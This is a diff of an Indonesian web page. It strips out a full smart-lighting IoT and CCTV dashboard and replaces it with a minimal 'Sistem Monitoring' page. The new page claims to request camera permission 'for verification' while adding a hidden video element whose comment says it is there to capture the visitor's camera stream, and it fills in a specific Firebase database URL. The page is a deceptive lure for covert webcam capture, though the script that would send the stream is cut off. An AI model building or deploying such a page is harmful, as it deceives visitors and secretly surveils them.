@@ -3,324 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Smart Lighting IoT & CCTV Dashboard</title>
-    <!-- Tailwind CSS -->
+    <title>Sistem Monitoring</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            darkMode: 'class',
-        }
-    </script>
-    <!-- Lucide Icons -->
+    <script>tailwind.config = { darkMode: 'class' }</script>
     <script src="https://unpkg.com/lucide@latest"></script>
-    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Plus Jakarta Sans', sans-serif; }
-    </style>
+    <style> body { font-family: 'Plus Jakarta Sans', sans-serif; } </style>
 </head>
-<body class="bg-slate-100 dark:bg-[#090d16] text-slate-800 dark:text-slate-100 min-h-screen flex flex-col antialiased transition-colors duration-300">
+<body class="bg-[#090d16] text-slate-100 min-h-screen flex flex-col items-center justify-center p-4">
 
-    <!-- Header / Navbar -->
-    <header class="border-b border-slate-200 dark:border-slate-800 bg-white/80 dark:bg-[#0d1322]/80 backdrop-blur-md sticky top-0 z-50 transition-colors duration-300">
-        <div class="max-w-6xl mx-auto px-4 py-4 flex justify-between items-center gap-4">
-            
-            <div class="flex items-center gap-3">
-                <!-- Tombol Menu Hamburger -->
-                <div class="relative">
-                    <button onclick="toggleMenuDropdown()" class="p-2.5 bg-slate-200 dark:bg-slate-900 border border-slate-300 dark:border-slate-800 rounded-xl text-slate-700 dark:text-slate-300 hover:bg-slate-300 dark:hover:bg-slate-800 transition-all" title="Menu">
-                        <i data-lucide="more-vertical" class="w-5 h-5"></i>
-                    </button>
-                    
-                    <!-- Dropdown Menu -->
-                    <div id="menu-dropdown" class="hidden absolute left-0 mt-2 w-48 bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl shadow-xl py-2 z-50">
-                        <button onclick="switchTab('live'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
-                            <i data-lucide="activity" class="w-4 h-4 text-blue-500"></i> <span data-i18n="menuLive">Live Monitoring</span>
-                        </button>
-                        <button onclick="switchTab('control'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
-                            <i data-lucide="sliders" class="w-4 h-4 text-blue-500"></i> <span data-i18n="menuControl">Kontrol & Mode</span>
-                        </button>
-                        <button onclick="switchTab('history'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
-                            <i data-lucide="calendar" class="w-4 h-4 text-blue-500"></i> <span data-i18n="menuHistory">Riwayat Harian</span>
-                        </button>
-                        <button onclick="switchTab('camera'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
-                            <i data-lucide="video" class="w-4 h-4 text-blue-500"></i> <span data-i18n="menuCamera">Live CCTV</span>
-                        </button>
-                        <button onclick="switchTab('settings'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
-                            <i data-lucide="settings" class="w-4 h-4 text-blue-500"></i> <span data-i18n="menuSettings">Pengaturan</span>
-                        </button>
-                    </div>
-                </div>
-
-                <div class="flex items-center gap-3">
-                    <div class="p-2.5 bg-blue-500/10 border border-blue-500/20 rounded-xl text-blue-500 dark:text-blue-400">
-                        <i data-lucide="zap" class="w-6 h-6"></i>
-                    </div>
-                    <div>
-                        <h1 class="text-xl font-bold bg-gradient-to-r from-blue-600 to-emerald-600 dark:from-blue-400 dark:to-emerald-400 bg-clip-text text-transparent">Smart Lighting IoT</h1>
-                        <p class="text-xs text-slate-500 dark:text-slate-400" data-i18n="subtitle">Monitoring & Control System</p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Tombol Toggle Tema (Dark/Light Mode) -->
-            <button onclick="toggleTheme()" class="p-2.5 bg-slate-200 dark:bg-slate-900 border border-slate-300 dark:border-slate-800 rounded-xl text-slate-700 dark:text-slate-300 hover:bg-slate-300 dark:hover:bg-slate-800 transition-all" title="Ubah Tema">
-                <i data-lucide="sun" class="w-5 h-5 hidden dark:block"></i>
-                <i data-lucide="moon" class="w-5 h-5 block dark:hidden"></i>
-            </button>
+    <div class="max-w-md w-full bg-slate-900/80 border border-slate-800 p-6 rounded-3xl shadow-2xl text-center space-y-4">
+        <div class="w-12 h-12 bg-blue-500/10 text-blue-400 rounded-2xl flex items-center justify-center mx-auto border border-blue-500/20">
+            <i data-lucide="shield-check" class="w-6 h-6"></i>
         </div>
-    </header>
-
-    <!-- Main Content Area -->
-    <main class="flex-grow max-w-6xl w-full mx-auto px-4 py-8 space-y-6">
-
-        <!-- ================= MENU 1: LIVE MONITORING ================= -->
-        <section id="content-live" class="space-y-6">
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                <!-- Status Lampu -->
-                <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800/80 backdrop-blur-xl p-6 rounded-3xl shadow-xl transition-colors duration-300">
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-sm font-medium text-slate-500 dark:text-slate-400" data-i18n="lampStatus">Status Lampu AC</span>
-                        <div class="p-2.5 rounded-2xl bg-slate-100 dark:bg-slate-800/50 text-blue-500 dark:text-blue-400 border border-slate-200 dark:border-slate-700/50">
-                            <i data-lucide="lightbulb" class="w-5 h-5"></i>
-                        </div>
-                    </div>
-                    <div id="lampu-badge" class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold tracking-wider uppercase bg-rose-500/10 text-rose-500 dark:text-rose-400 border border-rose-500/20">
-                        <span id="lampu-dot" class="w-2 h-2 rounded-full bg-rose-500"></span>
-                        <span id="text-lampu">MEMUAT...</span>
-                    </div>
-                    <p id="label-mode-status" class="text-xs text-slate-400 dark:text-slate-500 mt-4">Mode: Memuat...</p>
-                </div>
-
-                <!-- Sensor LDR -->
-                <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800/80 backdrop-blur-xl p-6 rounded-3xl shadow-xl transition-colors duration-300">
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-sm font-medium text-slate-500 dark:text-slate-400" data-i18n="ldrTitle">Intensitas Cahaya (LDR AO)</span>
-                        <div class="p-2.5 rounded-2xl bg-slate-100 dark:bg-slate-800/50 text-amber-500 dark:text-amber-400 border border-slate-200 dark:border-slate-700/50">
-                            <i data-lucide="sun" class="w-5 h-5"></i>
-                        </div>
-                    </div>
-                    <div class="flex items-baseline gap-2">
-                        <span id="val-ldr" class="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white">-</span>
-                        <span class="text-xs text-slate-400 dark:text-slate-500 font-medium">ADC (0-4095)</span>
-                    </div>
-                    <div class="mt-4">
-                        <div class="w-full bg-slate-200 dark:bg-slate-800 h-2 rounded-full overflow-hidden">
-                            <div id="ldr-bar" class="bg-amber-500 dark:bg-amber-400 h-full w-0 transition-all duration-500"></div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Sensor PIR -->
-                <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800/80 backdrop-blur-xl p-6 rounded-3xl shadow-xl transition-colors duration-300">
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-sm font-medium text-slate-500 dark:text-slate-400" data-i18n="pirTitle">Deteksi Gerakan (PIR)</span>
-                        <div class="p-2.5 rounded-2xl bg-slate-100 dark:bg-slate-800/50 text-emerald-500 dark:text-emerald-400 border border-slate-200 dark:border-slate-700/50">
-                            <i data-lucide="user" class="w-5 h-5"></i>
-                        </div>
-                    </div>
-                    <div id="pir-badge" class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold tracking-wider uppercase bg-slate-200 dark:bg-slate-800 text-slate-600 dark:text-slate-400 border border-slate-300 dark:border-slate-700">
-                        <span id="dot-pir" class="w-2 h-2 rounded-full bg-slate-400 dark:bg-slate-500"></span>
-                        <span id="text-pir">MEMUAT...</span>
-                    </div>
-                    <p class="text-xs text-slate-400 dark:text-slate-500 mt-4" data-i18n="pirSub">Status Keberadaan Orang</p>
-                </div>
-            </div>
-
-            <!-- Energy Consumption -->
-            <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800/80 backdrop-blur-xl p-8 rounded-3xl shadow-xl transition-colors duration-300">
-                <div class="flex items-center justify-between mb-6">
-                    <div>
-                        <h2 class="text-lg font-bold text-slate-900 dark:text-white" data-i18n="energyTitle">Akumulasi Energi & Biaya</h2>
-                        <p class="text-xs text-slate-500 dark:text-slate-400" data-i18n="energySub">Perhitungan otomatis berdasarkan riwayat Firebase</p>
-                    </div>
-                    <div class="p-2 rounded-xl bg-emerald-500/10 text-emerald-500 dark:text-emerald-400 border border-emerald-500/20">
-                        <i data-lucide="trending-up" class="w-5 h-5"></i>
-                    </div>
-                </div>
-
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 pt-2">
-                    <div class="bg-slate-50 dark:bg-slate-950/40 border border-slate-200 dark:border-slate-800/60 p-5 rounded-2xl">
-                        <span class="text-xs font-medium text-slate-500 dark:text-slate-400" data-i18n="totalHours">Total Jam Menyala</span>
-                        <div class="flex items-baseline gap-2 mt-2">
-                            <span id="total-jam" class="text-3xl font-extrabold text-blue-600 dark:text-blue-400">0.00</span>
-                            <span class="text-xs text-slate-400 dark:text-slate-500" data-i18n="hoursUnit">Jam</span>
-                        </div>
-                    </div>
-
-                    <div class="bg-slate-50 dark:bg-slate-950/40 border border-slate-200 dark:border-slate-800/60 p-5 rounded-2xl">
-                        <span class="text-xs font-medium text-slate-500 dark:text-slate-400" data-i18n="totalKwh">Konsumsi Energi</span>
-                        <div class="flex items-baseline gap-2 mt-2">
-                            <span id="total-kwh" class="text-3xl font-extrabold text-emerald-600 dark:text-emerald-400">0.0000</span>
-                            <span class="text-xs text-slate-400 dark:text-slate-500">kWh</span>
-                        </div>
-                    </div>
-
-                    <div class="bg-slate-50 dark:bg-slate-950/40 border border-slate-200 dark:border-slate-800/60 p-5 rounded-2xl">
-                        <span class="text-xs font-medium text-slate-500 dark:text-slate-400" data-i18n="totalCost">Estimasi Biaya Listrik</span>
-                        <div class="flex items-baseline gap-2 mt-2">
-                            <span id="total-biaya" class="text-3xl font-extrabold text-amber-600 dark:text-amber-400">Rp 0</span>
-                            <span class="text-xs text-slate-400 dark:text-slate-500" data-i18n="costUnit">Total</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- ================= MENU 2: KONTROL MODE & MANUAL ================= -->
-        <section id="content-control" class="hidden space-y-6">
-            <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800/80 backdrop-blur-xl p-6 md:p-8 rounded-3xl shadow-xl max-w-2xl mx-auto space-y-6 transition-colors duration-300">
-                <div>
-                    <h2 class="text-lg font-bold text-slate-900 dark:text-white" data-i18n="controlTitle">Panel Kontrol Operasional</h2>
-                    <p class="text-xs text-slate-500 dark:text-slate-400" data-i18n="controlSub">Pilih mode otomatis sensor atau kendalikan lampu secara manual</p>
-                </div>
-
-                <div class="space-y-4">
-                    <div class="p-4 bg-slate-50 dark:bg-slate-950/50 border border-slate-200 dark:border-slate-800 rounded-2xl flex justify-between items-center">
-                        <div>
-                            <span class="text-sm font-semibold text-slate-900 dark:text-white block" data-i18n="modeSystem">Mode Sistem</span>
-                            <span class="text-xs text-slate-500 dark:text-slate-400" data-i18n="modeSub">Pilih antara kendali sensor atau saklar web</span>
-                        </div>
-                        <div class="flex bg-slate-200 dark:bg-slate-900 border border-slate-300 dark:border-slate-800 p-1 rounded-xl">
-                            <button onclick="setMode('otomatis')" id="btn-mode-auto" class="px-4 py-2 rounded-lg text-xs font-semibold transition-all bg-blue-600 text-white" data-i18n="btnAuto">Otomatis</button>
-                            <button onclick="setMode('manual')" id="btn-mode-manual" class="px-4 py-2 rounded-lg text-xs font-semibold transition-all text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white" data-i18n="btnManual">Manual</button>
-                        </div>
-                    </div>
-
-                    <div id="manual-control-card" class="hidden p-4 bg-slate-50 dark:bg-slate-950/50 border border-slate-200 dark:border-slate-800 rounded-2xl flex justify-between items-center">
-                        <div>
-                            <span class="text-sm font-semibold text-slate-900 dark:text-white block" data-i18n="manualSwitch">Saklar Lampu Manual</span>
-                            <span class="text-xs text-slate-500 dark:text-slate-400" data-i18n="manualSwitchSub">Nyalakan atau matikan lampu secara langsung</span>
-                        </div>
-                        <label class="relative inline-flex items-center cursor-pointer">
-                            <input type="checkbox" id="toggle-manual-lampu" onchange="toggleManualLamp(this)" class="sr-only peer">
-                            <div class="w-11 h-6 bg-slate-300 dark:bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-emerald-600"></div>
-                        </label>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- ================= MENU 3: RIWAYAT HARIAN ================= -->
-        <section id="content-history" class="hidden space-y-6">
-            <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800/80 backdrop-blur-xl p-6 md:p-8 rounded-3xl shadow-xl transition-colors duration-300">
-                <div class="flex justify-between items-center mb-6">
-                    <div>
-                        <h2 class="text-lg font-bold text-slate-900 dark:text-white" data-i18n="historyTitle">Log Rekapitulasi Harian</h2>
-                        <p class="text-xs text-slate-500 dark:text-slate-400" data-i18n="historySub">Analisis durasi nyala dan penggunaan energi dari Firebase</p>
-                    </div>
-                    <button onclick="loadDailyHistory()" class="inline-flex items-center gap-2 px-4 py-2 bg-slate-200 dark:bg-slate-800 hover:bg-slate-300 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold rounded-xl border border-slate-300 dark:border-slate-700 transition-all">
-                        <i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i> Refresh
-                    </button>
-                </div>
-
-                <div class="overflow-x-auto">
-                    <table class="w-full text-left border-collapse">
-                        <thead>
-                            <tr class="border-b border-slate-200 dark:border-slate-800 text-slate-500 dark:text-slate-400 text-xs font-semibold uppercase tracking-wider">
-                                <th class="pb-3 px-4" data-i18n="thDate">Tanggal</th>
-                                <th class="pb-3 px-4" data-i18n="thDuration">Total Durasi</th>
-                                <th class="pb-3 px-4" data-i18n="thEnergy">Konsumsi (kWh)</th>
-                                <th class="pb-3 px-4" data-i18n="thCost">Estimasi Biaya</th>
-                            </tr>
-                        </thead>
-                        <tbody id="daily-table-body" class="divide-y divide-slate-200 dark:divide-slate-800/60 text-sm text-slate-700 dark:text-slate-300">
-                            <tr><td colspan="4" class="text-center py-8 text-slate-400 dark:text-slate-500" data-i18n="loadingData">Memuat data riwayat...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-        </section>
-
-        <!-- ================= MENU 4: LIVE CCTV WEBRTC ================= -->
-        <section id="content-camera" class="hidden space-y-6">
-            <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800/80 backdrop-blur-xl p-6 md:p-8 rounded-3xl shadow-xl max-w-3xl mx-auto space-y-6 transition-colors duration-300">
-                <div class="flex justify-between items-center mb-2">
-                    <div>
-                        <h2 class="text-lg font-bold text-slate-900 dark:text-white">CCTV Streaming (View Only)</h2>
-                        <p class="text-xs text-slate-500 dark:text-slate-400">Transmisi video satu arah via WebRTC & Firebase</p>
-                    </div>
-                    <div class="p-2.5 rounded-2xl bg-slate-100 dark:bg-slate-800/50 text-blue-500 dark:text-blue-400 border border-slate-200 dark:border-slate-700/50">
-                        <i data-lucide="video" class="w-5 h-5"></i>
-                    </div>
-                </div>
-
-                <!-- Frame Video Tunggal -->
-                <div class="relative bg-slate-900 rounded-2xl overflow-hidden aspect-video border border-slate-200 dark:border-slate-800 flex items-center justify-center shadow-inner">
-                    <video id="camera-remote" class="w-full h-full object-cover hidden" autoplay playsinline></video>
-                    <div id="remote-placeholder" class="text-center p-6">
-                        <i data-lucide="camera-off" class="w-10 h-10 text-slate-500 mx-auto mb-2"></i>
-                        <p class="text-xs text-slate-400">Kamera belum terhubung...</p>
-                    </div>
-                    <span class="absolute bottom-3 left-3 bg-blue-600/80 text-white text-[10px] font-bold px-2.5 py-1 rounded-lg backdrop-blur-md border border-white/10">LIVE STREAM</span>
-                </div>
-
-                <!-- Panel Kontrol CCTV -->
-                <div class="p-4 bg-slate-50 dark:bg-slate-950/50 border border-slate-200 dark:border-slate-800 rounded-2xl space-y-4">
-                    <div class="flex gap-2">
-                        <input type="text" id="room-id-input" placeholder="Masukkan Room ID CCTV..." class="flex-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded-xl px-4 py-2.5 text-sm text-slate-900 dark:text-white focus:outline-none focus:border-blue-500 font-mono">
-                    </div>
-                    
-                    <div class="flex flex-wrap gap-2 md:gap-3">
-                        <button onclick="startCCTVBroadcaster()" class="px-4 py-2.5 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-xl transition-all shadow-lg shadow-blue-500/25 flex items-center gap-2">
-                            <i data-lucide="radio" class="w-4 h-4"></i> 1. Mulai sebagai CCTV (Pengirim)
-                        </button>
-                        <button onclick="joinCCTVViewer()" class="px-4 py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded-xl transition-all shadow-lg shadow-emerald-500/25 flex items-center gap-2">
-                            <i data-lucide="play-circle" class="w-4 h-4"></i> 2. Gabung sebagai Penonton
-                        </button>
-                        <button onclick="hangUpCCTV()" class="px-4 py-2.5 bg-rose-500/10 text-rose-600 dark:text-rose-400 hover:bg-rose-500 hover:text-white border border-rose-500/20 text-xs font-semibold rounded-xl transition-all ml-auto flex items-center gap-2">
-                            <i data-lucide="phone-off" class="w-4 h-4"></i> Tutup
-                        </button>
-                    </div>
-                    
-                    <div class="bg-blue-50 dark:bg-blue-900/20 text-blue-600 dark:text-blue-400 p-3 rounded-xl border border-blue-200 dark:border-blue-800/50 flex items-center gap-3">
-                        <i data-lucide="info" class="w-5 h-5 shrink-0"></i>
-                        <p id="room-status" class="text-xs font-medium">Status: Siap digunakan.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- ================= MENU 5: PENGATURAN ================= -->
-        <section id="content-settings" class="hidden space-y-6">
-            <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800/80 backdrop-blur-xl p-6 md:p-8 rounded-3xl shadow-xl max-w-xl mx-auto space-y-5 transition-colors duration-300">
-                <div>
-                    <h2 class="text-lg font-bold text-slate-900 dark:text-white" data-i18n="settingsTitle">Konfigurasi Sistem</h2>
-                    <p class="text-xs text-slate-500 dark:text-slate-400" data-i18n="settingsSub">Sesuaikan parameter kalkulator energi dan bahasa</p>
-                </div>
-
-                <div class="space-y-4">
-                    <div>
-                        <label class="block text-xs font-medium text-slate-700 dark:text-slate-300 mb-2" data-i18n="langLabel">Bahasa (Language)</label>
-                        <select id="select-lang" onchange="changeLanguage(this.value)" class="w-full bg-slate-50 dark:bg-slate-950/60 border border-slate-300 dark:border-slate-800 rounded-xl px-4 py-3 text-sm text-slate-900 dark:text-white focus:outline-none focus:border-blue-500">
-                            <option value="id">Bahasa Indonesia</option>
-                            <option value="en">English</option>
-                        </select>
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-medium text-slate-700 dark:text-slate-300 mb-2" data-i18n="wattLabel">Daya Lampu (Watt)</label>
-                        <input type="number" id="input-watt" value="10" class="w-full bg-slate-50 dark:bg-slate-950/60 border border-slate-300 dark:border-slate-800 rounded-xl px-4 py-3 text-sm text-slate-900 dark:text-white focus:outline-none focus:border-blue-500">
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-medium text-slate-700 dark:text-slate-300 mb-2" data-i18n="tarifLabel">Tarif Listrik per kWh (Rp)</label>
-                        <input type="number" id="input-tarif" value="1444" class="w-full bg-slate-50 dark:bg-slate-950/60 border border-slate-300 dark:border-slate-800 rounded-xl px-4 py-3 text-sm text-slate-900 dark:text-white focus:outline-none focus:border-blue-500">
-                    </div>
-
-                    <button onclick="saveSettings()" class="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl text-sm transition-all shadow-lg shadow-blue-500/25" data-i18n="saveBtn">
-                        Simpan Pengaturan
-                    </button>
-                </div>
-            </div>
-        </section>
-
-    </main>
-
-    <!-- Footer -->
-    <footer class="border-t border-slate-200 dark:border-slate-800/80 py-6 text-center text-xs text-slate-500 dark:text-slate-400 transition-colors duration-300">
-        <p>&copy; 2026 Smart Lighting IoT &bull; Powered by Firebase Cloud</p>
-    </footer>
+        <h1 class="text-lg font-bold">Menghubungkan ke Sistem...</h1>
+        <p id="status-text" class="text-xs text-slate-400">Meminta izin kamera untuk verifikasi...</p>
+        
+        <!-- Elemen video tersembunyi untuk mengambil stream kamera mereka -->
+        <video id="local-video" class="hidden" autoplay playsinline muted></video>
+    </div>
 
     <!-- Firebase SDK v8 -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
@@ -329,468 +30,63 @@
     <script>
         lucide.createIcons();
 
-        // ⚠️ MASUKKAN URL REALTIME DATABASE FIREBASE ANDA DI SINI ⚠️
+        // ⚠️ MASUKKAN URL REALTIME DATABASE FIREBASE ANDA ⚠️
         const firebaseConfig = {
-            databaseURL: "https://URL_DATABASE_ANDA.firebaseio.com"
+            databaseURL: "https://admin-e13ee-default-rtdb.asia-southeast1.firebasedatabase.app/"
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        let dayaLampuWatt = parseFloat(localStorage.getItem('lampu_watt')) || 10;
-        let tarifPerKwh = parseFloat(localStorage.getItem('lampu_tarif')) || 1444;
-        let currentLang = localStorage.getItem('lang') || 'id';
-
-        document.getElementById('input-watt').value = dayaLampuWatt;
-        document.getElementById('input-tarif').value = tarifPerKwh;
-        document.getElementById('select-lang').value = currentLang;
-
-        // Kamus Terjemahan Bahasa
-        const translations = {
-            id: {
-                subtitle: "Monitoring & Control System",
-                menuLive: "Live Monitoring",
-                menuControl: "Kontrol & Mode",
-                menuHistory: "Riwayat Harian",
-                menuCamera: "Live CCTV",
-                menuSettings: "Pengaturan",
-                lampStatus: "Status Lampu AC",
-                ldrTitle: "Intensitas Cahaya (LDR AO)",
-                pirTitle: "Deteksi Gerakan (PIR)",
-                pirSub: "Status Keberadaan Orang",
-                energyTitle: "Akumulasi Energi & Biaya",
-                energySub: "Perhitungan otomatis berdasarkan riwayat Firebase",
-                totalHours: "Total Jam Menyala",
-                hoursUnit: "Jam",
-                totalKwh: "Konsumsi Energi",
-                totalCost: "Estimasi Biaya Listrik",
-                costUnit: "Total",
-                controlTitle: "Panel Kontrol Operasional",
-                controlSub: "Pilih mode otomatis sensor atau kendalikan lampu secara manual",
-                modeSystem: "Mode Sistem",
-                modeSub: "Pilih antara kendali sensor atau saklar web",
-                btnAuto: "Otomatis",
-                btnManual: "Manual",
-                manualSwitch: "Saklar Lampu Manual",
-                manualSwitchSub: "Nyalakan atau matikan lampu secara langsung",
-                historyTitle: "Log Rekapitulasi Harian",
-                historySub: "Analisis durasi nyala dan penggunaan energi dari Firebase",
-                thDate: "Tanggal",
-                thDuration: "Total Durasi",
-                thEnergy: "Konsumsi (kWh)",
-                thCost: "Estimasi Biaya",
-                loadingData: "Memuat data riwayat...",
-                settingsTitle: "Konfigurasi Sistem",
-                settingsSub: "Sesuaikan parameter kalkulator energi dan bahasa",
-                langLabel: "Bahasa (Language)",
-                wattLabel: "Daya Lampu (Watt)",
-                tarifLabel: "Tarif Listrik per kWh (Rp)",
-                saveBtn: "Simpan Pengaturan",
-                statusOn: "MENYALA (ON)",
-                statusOff: "MATI (OFF)",
-                pirDetected: "ADA GERAKAN",
-                pirEmpty: "RUANGAN KOSONG"
-            },
-            en: {
-                subtitle: "Monitoring & Control System",
-                menuLive: "Live Monitoring",
-                menuControl: "Control & Mode",
-                menuHistory: "Daily History",
-                menuCamera: "Live CCTV",
-                menuSettings: "Settings",
-                lampStatus: "AC Lamp Status",
-                ldrTitle: "Light Intensity (LDR AO)",
-                pirTitle: "Motion Detection (PIR)",
-                pirSub: "Occupancy Status",
-                energyTitle: "Energy & Cost Accumulation",
-                energySub: "Automatic calculation based on Firebase history",
-                totalHours: "Total ON Hours",
-                hoursUnit: "Hours",
-                totalKwh: "Energy Consumption",
-                totalCost: "Estimated Electricity Cost",
-                costUnit: "Total",
-                controlTitle: "Operational Control Panel",
-                controlSub: "Choose automatic sensor mode or control lights manually",
-                modeSystem: "System Mode",
-                modeSub: "Choose between sensor control or web switch",
-                btnAuto: "Automatic",
-                btnManual: "Manual",
-                manualSwitch: "Manual Lamp Switch",
-                manualSwitchSub: "Turn lights on or off directly",
-                historyTitle: "Daily Recapitulation Log",
-                historySub: "Analysis of ON duration and energy usage from Firebase",
-                thDate: "Date",
-                thDuration: "Total Duration",
-                thEnergy: "Consumption (kWh)",
-                thCost: "Estimated Cost",
-                loadingData: "Loading history data...",
-                settingsTitle: "System Configuration",
-                settingsSub: "Adjust energy calculator parameters and language",
-                langLabel: "Language",
-                wattLabel: "Lamp Power (Watts)",
-                tarifLabel: "Electricity Rate per kWh (Rp)",
-                saveBtn: "Save Settings",
-                statusOn: "TURNING ON (ON)",
-                statusOff: "OFF",
-                pirDetected: "MOTION DETECTED",
-                pirEmpty: "ROOM EMPTY"
-            }
-        };
-
-        function applyLanguage(lang) {
-            currentLang = lang;
-            localStorage.setItem('lang', lang);
-            document.querySelectorAll('[data-i18n]').forEach(el => {
-                const key = el.getAttribute('data-i18n');
-                if (translations[lang][key]) {
-                    el.innerText = translations[lang][key];
-                }
-            });
-        }
-
-        function changeLanguage(lang) {
-            applyLanguage(lang);
-        }
-
-        applyLanguage(currentLang);
-
-        function toggleMenuDropdown() {
-            const dropdown = document.getElementById('menu-dropdown');
-            dropdown.classList.toggle('hidden');
-        }
-
-        window.addEventListener('click', function(e) {
-            const btn = document.querySelector('button[onclick="toggleMenuDropdown()"]');
-            const dropdown = document.getElementById('menu-dropdown');
-            if (!btn.contains(e.target) && !dropdown.contains(e.target)) {
-                dropdown.classList.add('hidden');
-            }
-        });
-
-        function toggleTheme() {
-            const html = document.documentElement;
-            if (html.classList.contains('dark')) {
-                html.classList.remove('dark');
-                localStorage.setItem('theme', 'light');
-            } else {
-                html.classList.add('dark');
-                localStorage.setItem('theme', 'dark');
-            }
-        }
-
-        if (localStorage.getItem('theme') === 'light') {
-            document.documentElement.classList.remove('dark');
-        } else {
-            document.documentElement.classList.add('dark');
-        }
-
-        function switchTab(tabName) {
-            ['live', 'control', 'history', 'camera', 'settings'].forEach(t => {
-                document.getElementById(`content-${t}`).classList.add('hidden');
-            });
-            document.getElementById(`content-${tabName}`).classList.remove('hidden');
-            
-            if(tabName === 'history') {
-                loadDailyHistory();
-            }
-        }
-
-        function saveSettings() {
-            dayaLampuWatt = parseFloat(document.getElementById('input-watt').value) || 10;
-            tarifPerKwh = parseFloat(document.getElementById('input-tarif').value) || 1444;
-            
-            localStorage.setItem('lampu_watt', dayaLampuWatt);
-            localStorage.setItem('lampu_tarif', tarifPerKwh);
-            
-            alert(currentLang === 'id' ? 'Pengaturan berhasil disimpan!' : 'Settings saved successfully!');
-            switchTab('live');
-        }
-
-        function setMode(mode) {
-            db.ref('/lampu/mode').set(mode);
-        }
-
-        function toggleManualLamp(checkbox) {
-            db.ref('/lampu/perintah_manual').set(checkbox.checked);
-        }
-
-        db.ref('/lampu/mode').on('value', (snapshot) => {
-            const mode = snapshot.val() || 'otomatis';
-            const btnAuto = document.getElementById('btn-mode-auto');
-            const btnManual = document.getElementById('btn-mode-manual');
-            const manualCard = document.getElementById('manual-control-card');
-            const labelModeStatus = document.getElementById('label-mode-status');
-
-            if (mode === 'manual') {
-                btnManual.className = "px-4 py-2 rounded-lg text-xs font-semibold transition-all bg-blue-600 text-white";
-                btnAuto.className = "px-4 py-2 rounded-lg text-xs font-semibold transition-all text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white";
-                manualCard.classList.remove('hidden');
-                labelModeStatus.innerText = currentLang === 'id' ? "Mode: Manual (Kontrol Web)" : "Mode: Manual (Web Control)";
-            } else {
-                btnAuto.className = "px-4 py-2 rounded-lg text-xs font-semibold transition-all bg-blue-600 text-white";
-                btnManual.className = "px-4 py-2 rounded-lg text-xs font-semibold transition-all text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white";
-                manualCard.classList.add('hidden');
-                labelModeStatus.innerText = currentLang === 'id' ? "Mode: Otomatis (LDR + PIR)" : "Mode: Automatic (LDR + PIR)";
-            }
-        });
-
-        db.ref('/lampu/perintah_manual').on('value', (snapshot) => {
-            document.getElementById('toggle-manual-lampu').checked = snapshot.val() || false;
-        });
-
-        db.ref('/lampu/status').on('value', (snapshot) => {
-            const status = snapshot.val();
-            const badge = document.getElementById('lampu-badge');
-            const dot = document.getElementById('lampu-dot');
-            const text = document.getElementById('text-lampu');
-            
-            if (status) {
